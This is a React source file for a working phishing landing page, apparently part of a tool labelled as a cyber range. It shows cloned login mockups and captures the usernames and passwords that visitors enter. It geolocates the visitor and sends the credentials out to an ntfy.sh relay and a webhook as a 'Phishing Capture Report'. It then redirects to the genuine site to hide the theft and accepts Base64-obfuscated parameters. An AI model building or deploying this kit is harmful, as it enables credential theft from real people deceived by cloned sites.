import React, { useState, useEffect } from 'react';
import { useSearchParams } from 'react-router-dom';
import { CLONE_MOCKUPS } from '../../data/social-mockups';
import { Monitor, Shield, AlertTriangle } from 'lucide-react';
import { cyberRangeBus, RANGE_EVENTS } from '../../utils/cyberRangeBus';

const LandingNode = () => {
    const [searchParams] = useSearchParams();

    // Support for Base64 obfuscated parameters
    const encoded = searchParams.get('e');
    let platform = searchParams.get('p') || 'generic';
    let targetUrl = searchParams.get('url') || 'https://secure-portal.com';
    let relayId = searchParams.get('r');

    if (encoded) {
        try {
            const decoded = atob(encoded);
            const params = new URLSearchParams(decoded);
            platform = params.get('p') || platform;
            targetUrl = params.get('url') || targetUrl;
            relayId = params.get('r') || relayId;
        } catch (e) {
            console.error("Failed to decode parameters");
        }
    }

    const webhookUrl = localStorage.getItem('se_webhook');
    const [captureInputs, setCaptureInputs] = useState({ user: '', pass: '' });
    const [status, setStatus] = useState('active'); // active, processing, success, error

    const onHarvest = (field, value) => {
        setCaptureInputs(prev => ({ ...prev, [field]: value }));
    };

    const parseDeviceInfo = () => {
        const ua = navigator.userAgent;
        let device = "Desktop PC";
        if (/android/i.test(ua)) device = "Android Device";
        else if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS Device";

        let browser = "Web Browser";
        if (/chrome/i.test(ua)) browser = "Chrome";
        else if (/safari/i.test(ua)) browser = "Safari";
        else if (/firefox/i.test(ua)) browser = "Firefox";

        return { device, browser };
    };

    const onFinish = async () => {
        if (!captureInputs.user && !captureInputs.pass) return;

        setStatus('processing');
        const info = parseDeviceInfo();

        // Fetch Geolocation
        let location = "Unknown";
        try {
            const geoRes = await fetch('https://ipapi.co/json/');
            const geoData = await geoRes.json();
            location = `${geoData.city}, ${geoData.country_name} (${geoData.ip})`;
        } catch (e) {
            console.error("Geo lookup failed");
        }

        const payload = {
            id: Date.now(),
            time: new Date().toLocaleTimeString(),
            domain: window.location.hostname,
            platform: platform,
            data: `${captureInputs.user || 'N/A'} : ${captureInputs.pass || '******'}`,
            device: `${info.device} (${info.browser})`,
            location: location,
            userAgent: navigator.userAgent
        };

        // --- CYBER RANGE EVENT BUS (Local Feedback) ---
        cyberRangeBus.emit(RANGE_EVENTS.C2_BEACON, {
            id: `SESS-${Math.floor(Math.random() * 9999)}`,
            ip: location.split('(')[1]?.replace(')', '') || '127.0.0.1',
            os: info.device,
            user: captureInputs.user || 'victim',
            status: 'active',
            tier: 'high',
            source: 'Social Eng Pro'
        });

        cyberRangeBus.emit(RANGE_EVENTS.DEFENSE_ALERT, {
            event_id: 4625,
            desc: `Suspicious Login: ${captureInputs.user} (Phishing Detected)`,
            src_ip: location.split('(')[1]?.replace(')', '') || '127.0.0.1',
            severity: 'high'
        });
        // ---------------------------------------------

        // 1. Send to Global Relay (ntfy.sh)
        if (relayId) {
            try {
                await fetch(`https://ntfy.sh/${relayId}`, {
                    method: 'POST',
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error("Relay failed:", err);
            }
        }

        // 2. Send to Webhook (as backup)
        if (webhookUrl) {
            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🚨 **Intel Captured**\n**Platform:** ${platform.toUpperCase()}\n**Location:** ${location}`,
                        embeds: [{
                            title: "Phishing Capture Report",
                            color: 15158332,
                            fields: [
                                { name: "User/Email", value: captureInputs.user || "N/A", inline: true },
                                { name: "Password", value: captureInputs.pass || "******", inline: true },
                                { name: "Device Info", value: payload.device, inline: false },
                                { name: "Location", value: location, inline: false }
                            ]
                        }]
                    })
                });
            } catch (err) {
                console.error("Exfil failed:", err);
            }
        }

        // Redirect to real site to complete the illusion
        setTimeout(() => {
            window.location.href = targetUrl;
        }, 1500);
    };

    const mockup = CLONE_MOCKUPS[platform] || CLONE_MOCKUPS.generic;

    return (
        <div className="min-h-screen bg-[#f0f2f5] flex items-center justify-center p-4 font-sans text-black">
            <style>
                {`
                    body { background-color: #f0f2f5 !important; }
                    #root { height: 100%; display: flex; align-items: center; justify-content: center; }
                `}
            </style>

            {status === 'active' ? (
                mockup({ onHarvest, onFinish }, targetUrl)
            ) : (
                <div className="text-center p-10 bg-white rounded-xl shadow-lg border border-gray-100 max-w-sm font-sans">
                    <div className="w-16 h-16 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-6">
                        <Shield className="animate-pulse" size={32} />
                    </div>
                    <h2 className="text-xl font-bold text-gray-800 mb-2">Connecting Securely...</h2>
                    <p className="text-sm text-gray-500">Verifying session credentials and establishing encrypted tunnel.</p>
                </div>
            )}
        </div>
    );
};

export default LandingNode;
